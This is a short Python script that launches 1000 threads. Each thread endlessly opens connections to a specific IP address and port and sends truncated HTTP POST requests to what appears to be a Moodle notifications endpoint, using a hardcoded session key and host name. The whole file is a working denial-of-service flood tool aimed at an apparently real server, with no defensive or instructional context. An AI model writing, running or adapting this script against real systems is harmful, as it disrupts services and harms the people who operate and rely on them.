import socket
import threading
import time

def attack(no):
    def f():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(("180.97.75.243",18081))
                s.send(("POST /lib/ajax/service.php?sesskey=3o8EHVv3EF&info=core_fetch_notifications HTTP/1.1\r\n").encode('ascii'))
                s.send(("Host: xmxx.mj-nt.cn:18081\r\n\r\n").encode('ascii'))
                s.close()
            except Exception as e:
                print(str(no)+": "+str(e))
    return f

for i in range(1000):
    thread = threading.Thread(target=attack(i))
    print('Connecting thread #%d...' % i)
    thread.start()
